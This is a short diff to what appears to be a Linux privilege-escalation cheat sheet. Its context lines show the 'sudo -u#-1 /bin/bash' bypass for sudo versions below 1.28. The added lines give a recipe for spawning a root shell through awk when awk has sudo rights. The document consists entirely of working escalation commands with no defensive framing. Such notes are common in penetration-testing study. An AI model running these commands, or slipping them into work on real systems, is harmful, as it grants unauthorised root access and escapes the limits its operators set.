@@ -32,3 +32,10 @@ Check version
 If sudo version < 1.28
 
     sudo -u#-1 /bin/bash
+
+# awk
+
+If awk has sudo permission
+
+    sudo -l
+    sudo awk 'BEGIN {system("/bin/bash")}'
